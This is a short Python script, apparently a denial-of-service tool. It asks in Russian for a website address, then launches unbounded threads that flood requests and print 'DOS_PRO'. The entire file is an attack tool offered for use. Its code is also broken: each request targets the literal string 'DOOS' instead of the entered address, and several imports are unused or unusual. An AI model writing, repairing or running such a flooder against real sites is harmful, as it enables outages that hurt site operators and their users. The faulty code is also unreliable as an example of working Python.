# coding: utf8
import threading
import requests
import random
import colorsys
import colored
import colorama
import banner
import webbrowser
from pystyle import Colorate, Colors
import os
import pystyle
import subprocess
import socket
import pyfiglet
import randmac
import username

DOOS = input(Colorate.Horizontal(Colors.red_to_yellow, ("Введите адрес сайта:").strip()))
def dos():
   while True:
    requests.get("DOOS")
  
while True:
   threading.Thread(target=dos).start()
   print("\033[91m" + "DOS_PRO" + "\033[0m")
   